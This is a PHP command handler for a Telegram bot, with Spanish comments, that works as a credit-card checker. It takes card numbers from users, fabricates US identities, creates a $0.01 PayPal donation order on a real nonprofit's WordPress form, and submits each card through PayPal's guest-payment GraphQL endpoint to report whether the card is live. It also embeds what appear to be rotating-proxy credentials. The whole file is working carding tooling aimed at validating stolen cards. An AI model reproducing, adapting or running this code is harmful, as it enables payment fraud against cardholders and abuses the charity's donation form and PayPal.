<?php

$gatewayname="pp";
if (preg_match('/^[\/\.,\$](?:'.$gatewayname.')(?:\s+(.+))?$/i', $message, $matches)) {
   //==================[Inicializacion de variables]======================//
   $messages = $bot->loadPlantillas();
   $gateway = "#Paypal_Charged ($0.01)";
   $lang = $db->getUserLanguage($userId);
   //==================[Manejo de los Usuarios]======================//
    $accessMessage = $db->verifyUserAccess($userId, $chat_id,'$'.$gatewayname);
if ($accessMessage !== null) {
$bot->callApi('sendMessage', [
    'chat_id' => $chat_id,
    'text' => $bot->translateTemplate($accessMessage, 'en', $lang),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
    ]);
    return; 
    }
//==================[Mensaje configuracion y time]======================//
$lista = $bot->getCleanList($message, $replyMessageText);
$starttim = microtime(true);
//==================[REGEX]======================//
$validationResult = $bot->validateCreditCard($lista);
if (is_string($validationResult)) {
    $editmessage = $bot->callApi('SendMessage', [
        'chat_id' => $chat_id,
        'text' => $bot->translateTemplate($validationResult, 'en', $lang),
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true

    ])
    ]);
    sleep(3);
    $bot->callApi('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $editmessage 
    ]);
    return;
}

$cc = $validationResult['cc'];
$mes = $validationResult['mes'];
$ano = $validationResult['ano'];
$ano1 = (strlen($year) == 2) ? $ano : substr($ano, 2);
$cvv = $validationResult['cvv'];
$creditcard = $validationResult['creditcard'];
    //==================[Antispam]======================//
    $antispam = $db->antispamCheck($userId,$username?:$firstname);

    if($antispam != False){
        $editmessage = $bot->callApi('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>$antispam,
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    
        ])
      ]);
      sleep(3);
      $bot->callApi('deleteMessage', [
          'chat_id' => $chat_id,
          'message_id' => $editmessage 
      ]);
      return;
    }
$editmessage = $bot->callApi('SendMessage', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['vSiesta_gateway'], 'en', $lang),
$gateway,
    $creditcard),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
]);
 //==================[Random Direcciones]======================//
    $userData = Fake::GetUser('US');

    $firstName = $userData['first_name'];
    $lastName = $userData['last_name'];
    $username1 = $userData['username'];
    $email = $userData['email'];
    $password = $userData['password'];
    $phone = $userData['phone']['format2'];
    $userAgent = $userData['userAgent'];

    $street = $userData['street'];
    $country = $userData['country'];
    $iso2 = $userData['iso2'];
    $state = $userData['state'];
    $state_id = $userData['state_id'];
    $city = $userData['city'];
    $zip = $userData['zip'];
 //==================[Bin Verificador]======================//
    $bin = substr($cc, 0, 6);
    $resultado = $bot->verificarBin($bin);

    if (!is_string($resultado)) { // Verificamos que no sea un mensaje de error
        $brand = $resultado['brand'];
        $country = $resultado['country'];
        $country_name = $resultado['country_name'];
        $country_flag = $resultado['country_flag'];
        $country_currencies = $resultado['country_currencies'];
        $bank = $resultado['bank'];
        $level = $resultado['level'];
        $type = $resultado['type'];
    } else {
        $bot->callApi('EditMessageText', [
            'chat_id' => $chat_id,
            'text' => $resultado,
            'parse_mode' => 'html',
            'message_id' => $editmessage,
         
        ]);
        exit();
    }
    
 //==================[Proxys y Cookies]======================//
$socks5 = "gw.dataimpulse.com:823";
$rotate = "b097452cc0d2c2bcc268:7580f00952ea0161";

$cookie = uniqid();


$proxies = null;

 //==================[Curl Request]======================//

 $response = CurlX::Get(
    "https://schoolforstrings.org/donate/",
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
$nonce = CurlX::ParseString($response->body,'"create_order_nonce":"','"');



$response = CurlX::Post(
    "https://schoolforstrings.org/wp-admin/admin-ajax.php?action=gfppcp_create_order",
    '{"nonce":"'.$nonce.'","data":{"payer":{"name":{"given_name":"alex","surname":"frick"},"email_address":"alexhhh@gmail.com"},"purchase_units":[{"amount":{"value":"0.01","currency_code":"USD","breakdown":{"item_total":{"value":"0.01","currency_code":"USD"},"shipping":{"value":"0","currency_code":"USD"}}},"description":"PayPal Commerce Platform Feed 1","items":[{"name":"Other Amount","description":"","unit_amount":{"value":"0","currency_code":"USD"},"quantity":1},{"name":"Other Amount","description":"","unit_amount":{"value":"0.01","currency_code":"USD"},"quantity":1}],"shipping":{"name":{"full_name":"alex frick"}}}],"application_context":{"shipping_preference":"GET_FROM_FILE"}},"form_id":6,"feed_id":"2"}',
    [
        'accept: */*',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://schoolforstrings.org/donate/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
$responseData = json_decode($response->body, true);
$orderID = $responseData['data']['orderID'];

$data = [
    "query" => 'mutation payWithCard($token: String! $card: CardInput! $phoneNumber: String $firstName: String $lastName: String $shippingAddress: AddressInput $billingAddress: AddressInput $email: String $currencyConversionType: CheckoutCurrencyConversionType $installmentTerm: Int) { approveGuestPaymentWithCreditCard(token: $token card: $card phoneNumber: $phoneNumber firstName: $firstName lastName: $lastName email: $email shippingAddress: $shippingAddress billingAddress: $billingAddress currencyConversionType: $currencyConversionType installmentTerm: $installmentTerm) { flags { is3DSecureRequired } cart { intent cartId buyer { userId auth { accessToken } } returnUrl { href } } paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } } } }',
    "variables" => [
        "token" => $orderID,
        "card" => [
            "cardNumber" => $cc,
            "expirationDate" => "$mes/$ano",
            "postalCode" => $zip,
            "securityCode" => $cvv
        ],
        "phoneNumber" => '2098765432', // Genera un número de teléfono válido para la prueba
        "firstName" => 'John', // Define un nombre
        "lastName" => 'Doe', // Define un apellido
        "billingAddress" => [
            "givenName" => 'John',
            "familyName" => 'Doe',
            "line1" => $street,
            "line2" => "",
            "city" => $city,
            "state" => $state_id,
            "postalCode" => $zip,
            "country" => "US"
        ],
        "shippingAddress" => [
            "givenName" => 'John',
            "familyName" => 'Doe',
            "line1" => $street,
            "line2" => "",
            "city" =>$city,
            "state" => $state,
            "postalCode" => $zip,
            "country" => "US"
        ],
        "email" => $correoRand,
        "currencyConversionType" => "PAYPAL"
    ],
    "operationName" => false
];
$response = CurlX::Post(
    "https://www.paypal.com/graphql?fetch_credit_form_submit",
    json_encode($data),
    [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
        'Accept: */*',
        'Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
        // 'Accept-Encoding: gzip, deflate, br',
        'Content-Type: application/json',
        'x-country: US',
        'x-app-name: standardcardfields',
        'paypal-client-context: ' . $orderID,
        'paypal-client-metadata-id: ' . $orderID,
        'Origin: https://www.paypal.com',
        'Connection: keep-alive'
    ],
    $cookie,
    $proxies
);
$errormessage = "null";



 //==================[Manejo de los mensajes]======================//
 $errormessage = "null";

 if (strpos($response->body, 'NEED_CREDIT_CARD') !== false) {
     $jsonResponse = json_decode($response->body, true);
     $code = "NON_PAYABLE";
     $message1 = $jsonResponse['errors'][0]['message'] ?? 'No message available';
     echo $code . ", " . $message;
 } elseif (strpos($response->body, 'CANNOT_CLEAR_3DS_CONTINGENCY') !== false) {
     $jsonResponse = json_decode($response->body, true);
     $message1 = $jsonResponse['errors'][0]['message'] ?? 'No message available';
     echo "3DS_ERROR, " . $message;
 } elseif (strpos($response->body, 'errors') !== false) {
     $jsonResponse = json_decode($response->body, true);
     $code = $jsonResponse['errors'][0]['data'][0]['code'] ?? 'NULL';
     $message1 = $jsonResponse['errors'][0]['message'] ?? 'No message available';
     echo $code . ", " . $message;
 } elseif (strpos($response->body, 'is3DSecureRequired') !== false) {
     $errormessage= "CHARGED 0.01$";
 } else {
     $errormessage="There was a problem processing the request";
     file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
 }

 //==================[Fin time]======================//
$starttime = intval(microtime(true) - $starttim);
 //==================[Manejo del bot]======================//
 $lang = $db->getUserLanguage($userId);
 if($errormessage=="CHARGED 0.01$"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            "Charged $0.01",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
 
        ])
     
    ]);
 }
 elseif($errormessage == "There was a problem processing the request"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
     
            ])
    ]);
 }
 
 else{
$bot->callApi('EditMessageText', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['gateway'], 'en', $lang),
        $gateway,
        $creditcard,
        $bot->translateText("Declined!❌", "en", $lang),
      "$message1 ($code)",
        "$type - $level",
        $bank,
        "$country_name$country_flag",
        $starttime,
        $username ?: $firstname
    ),
    'parse_mode' => 'html',
    'message_id' => $editmessage,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
 
        ])
]);
}}
